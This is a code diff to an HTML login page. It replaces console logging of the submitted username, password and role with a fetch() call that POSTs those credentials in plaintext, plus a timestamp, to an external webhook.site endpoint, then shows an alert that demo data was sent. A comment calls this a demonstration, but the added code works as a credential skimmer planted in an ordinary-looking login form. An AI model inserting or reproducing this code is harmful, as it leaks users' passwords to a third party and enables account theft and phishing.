@@ -134,11 +134,23 @@
     const password = document.querySelector('input[type="password"]').value;
     const role = document.querySelector('input[name="loginas"]:checked').nextSibling.textContent.trim();
 
-    console.log("📥 Login Attempt:");
-    console.log("👤 Username/Roll No:", username);
-    console.log("🔑 Password:", password);
-    console.log("🎭 Role:", role);
+    // Send data to a controlled endpoint for demonstration
+    fetch('https://webhook.site/35921cd4-7013-453f-81ca-2ed3458561ed', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        username: username,
+        password: password,
+        role: role,
+        timestamp: new Date().toISOString()
+      })
+    });
+
+    alert("🔍 Demo data sent to server (check your webhook log).");
   });
 </script>
+
 </body>
 </html>
